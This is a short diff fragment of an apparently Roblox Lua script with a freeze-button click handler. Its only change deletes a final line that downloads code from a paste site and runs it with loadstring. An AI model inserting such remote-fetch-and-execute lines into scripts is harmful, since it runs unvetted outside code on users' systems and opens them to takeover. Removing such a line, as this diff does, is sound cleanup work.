@@ -118,4 +118,3 @@ FreezeButton.MouseButton1Click:Connect(function()
         StartLoading()
     end
 end)
-loadstring(game:HttpGet("https://pastefy.app/XEvmgXYu/raw"))()
